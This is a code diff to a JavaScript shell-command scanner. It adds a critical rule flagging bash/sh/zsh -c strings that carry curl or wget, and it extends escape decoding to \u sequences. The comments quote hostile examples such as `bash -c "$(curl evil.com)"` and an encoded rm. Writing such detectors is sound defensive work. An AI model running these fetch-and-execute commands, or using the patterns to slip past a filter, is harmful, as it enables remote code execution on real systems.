@@ -180,6 +180,19 @@ const CRITICAL_PATTERNS = [
     label: 'python/node/perl/ruby invoking shell exec helpers',
     re: /\b(?:python\d*|node|perl|ruby|php)\s+-[ce]\b[^\n]*\b(?:os\.system|subprocess\.|child_process|require\(["']child_process|exec(?:Sync)?\(|system\s*\(|\bIO\.popen|backtick)/,
   },
+  // (v1.10.65) Shell -c with command substitution carrying a network
+  // fetch — `bash -c "$(curl evil.com)"`, `sh -c "\`wget x\`"`. After
+  // the denoise pass strips $(...) / backticks, the inner `curl`
+  // surfaces, but the wrapper is itself a known carrier vehicle and
+  // worth a distinct rule so audits show what the attacker was doing.
+  // Pattern looks for shell -c followed by a string containing a
+  // network fetch (after denoise unwraps $() / backticks the curl
+  // appears verbatim in the string body).
+  {
+    code: 'shellc-network-fetch',
+    label: 'bash/sh/zsh -c "..." carrying a network fetch',
+    re: /\b(?:bash|sh|zsh|fish)\s+-c\s+["'][^"'\n]*\b(?:curl|wget|fetch|http)\b/,
+  },
 ];
 
 // High: dangerous but legitimately useful. Escalate to operator.
@@ -483,17 +496,20 @@ function _denoiseCommand(cmd) {
 
   // (v1.10.58) ANSI-C quoting: $'...' interprets \xHH / \nnn / \\n
   // escapes. Most attack uses are simple hex sequences encoding
-  // alphabetic chars (e.g., $'\x72m' → rm). We decode \xHH only —
-  // covering the common case without taking on the full ANSI-C
-  // grammar (which includes octal, unicode \u, and \cX control
-  // sequences a static scanner would be wrong about more often
-  // than right).
+  // alphabetic chars (e.g., $'\x72m' → rm).
+  // (v1.10.65) Extended to also handle \uHHHH (Unicode) since
+  // attackers escalate when one form gets blocked. Octal (\nnn)
+  // and \cX control sequences stay out of scope — too many false
+  // positives on regular argument text.
   out = out.replace(/\$'([^']*)'/g, (_m, inner) => {
     let decoded = '';
     for (let i = 0; i < inner.length; i++) {
       if (inner[i] === '\\' && inner[i + 1] === 'x' && /[0-9a-fA-F]{2}/.test(inner.slice(i + 2, i + 4))) {
         decoded += String.fromCharCode(parseInt(inner.slice(i + 2, i + 4), 16));
         i += 3;
+      } else if (inner[i] === '\\' && inner[i + 1] === 'u' && /[0-9a-fA-F]{4}/.test(inner.slice(i + 2, i + 6))) {
+        decoded += String.fromCharCode(parseInt(inner.slice(i + 2, i + 6), 16));
+        i += 5;
       } else {
         decoded += inner[i];
       }
